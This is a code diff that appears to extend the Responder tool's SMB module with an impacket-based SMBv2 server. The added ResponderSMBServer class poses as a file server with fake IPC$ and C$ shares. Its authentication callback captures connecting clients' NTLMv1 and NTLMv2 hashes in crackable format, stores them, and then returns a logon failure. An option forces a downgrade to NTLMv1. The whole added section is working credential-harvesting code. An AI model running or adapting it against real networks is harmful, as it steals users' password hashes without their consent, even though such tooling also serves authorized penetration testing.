@@ -24,6 +24,14 @@ else:
 from random import randrange
 from packets import SMBHeader, SMBNegoAnsLM, SMBNegoKerbAns, SMBSession1Data, SMBSession2Accept, SMBSessEmpty, SMBTreeData, SMB2Header, SMB2NegoAns, SMB2Session1Data, SMB2Session2Data
 
+# Import impacket for SMBv2 support
+try:
+	from impacket.smbserver import SMBSERVER, SimpleSMBServer
+	from impacket.ntlm import USE_NTLMv2
+	from impacket.smbserver import SMBSERVERHandler
+	IMPACKET_AVAILABLE = True
+except ImportError:
+	IMPACKET_AVAILABLE = False
 
 def Is_Anonymous(data):  # Detect if SMB auth was Anonymous
 	SecBlobLen = struct.unpack('<H',data[51:53])[0]
@@ -373,3 +381,82 @@ class SMB1LM(BaseRequestHandler):  # SMB Server class, old version
 		except Exception:
 			self.request.close()
 			pass
+
+class ResponderSMBServer(SimpleSMBServer):
+	"""Custom SMB server that integrates with Responder's credential capture"""
+	
+	def __init__(self, listenAddress='0.0.0.0', listenPort=445, configFile=''):
+		SimpleSMBServer.__init__(self, listenAddress, listenPort, configFile)
+		self.setSMB2Support(True)
+		
+		# Set up authentication callback
+		def auth_callback(connectionId, username, client, password, domain, lmhash, nthash):
+			client_ip = client.getpeername()[0]
+			
+			if lmhash and nthash:
+				# Parse and save the hash
+				if len(nthash) == 24:  # NTLMv1
+					WriteHash = '%s::%s:%s:%s:%s' % (username, domain, lmhash.hex().upper(), nthash.hex().upper(), RandomChallenge().hex())
+					SaveToDb({
+						'module': 'SMB', 
+						'type': 'NTLMv1-SSP', 
+						'client': client_ip, 
+						'user': domain+'\\'+username, 
+						'hash': nthash.hex().upper(), 
+						'fullhash': WriteHash,
+					})
+				else:  # NTLMv2
+					WriteHash = '%s::%s:%s:%s:%s' % (username, domain, RandomChallenge().hex(), nthash[:32].hex().upper(), nthash[32:].hex().upper())
+					SaveToDb({
+						'module': 'SMB', 
+						'type': 'NTLMv2-SSP', 
+						'client': client_ip, 
+						'user': domain+'\\'+username, 
+						'hash': nthash.hex().upper(), 
+						'fullhash': WriteHash,
+					})
+			
+			# Return appropriate error code based on settings
+			if settings.Config.ErrorCode:
+				return 0xC000006D  # STATUS_LOGON_FAILURE
+			else:
+				return 0xC0000022  # STATUS_ACCESS_DENIED
+		
+		self.setAuthCallback(auth_callback)
+		
+		# Add default shares
+		self.addShare('IPC$', '/tmp', comment='')
+		self.addShare('C$', '/tmp', comment='')
+
+def serve_smb2_server(host, port):
+	"""Function to serve SMBv2 server using impacket"""
+	if not IMPACKET_AVAILABLE:
+		print(color("[!] ", 1, 1) + "Impacket not available. SMBv2 support requires impacket to be installed.")
+		return
+	
+	try:
+		# Configure NTLM settings based on Responder options
+		if settings.Config.LM_On_Off:
+			# Force NTLMv1 by setting USE_NTLMv2 to False
+			import impacket.ntlm
+			original_ntlmv2_setting = impacket.ntlm.USE_NTLMv2
+			impacket.ntlm.USE_NTLMv2 = False
+		
+		# Create and configure the SMB server
+		smb_server = ResponderSMBServer(host, port)
+		
+		# Start the server
+		smb_server.start()
+		
+	except Exception as e:
+		print(color("[!] ", 1, 1) + f"SMBv2 error: {str(e)}")
+	finally:
+		# Restore original NTLMv2 setting if we changed it
+		if settings.Config.LM_On_Off and IMPACKET_AVAILABLE:
+			import impacket.ntlm
+			impacket.ntlm.USE_NTLMv2 = original_ntlmv2_setting
+
+class SMB2(BaseRequestHandler):  # SMBv2 Server class using impacket
+	def handle(self):
+		# This is a placeholder - the actual server is started by serve_smb2_server
+		pass
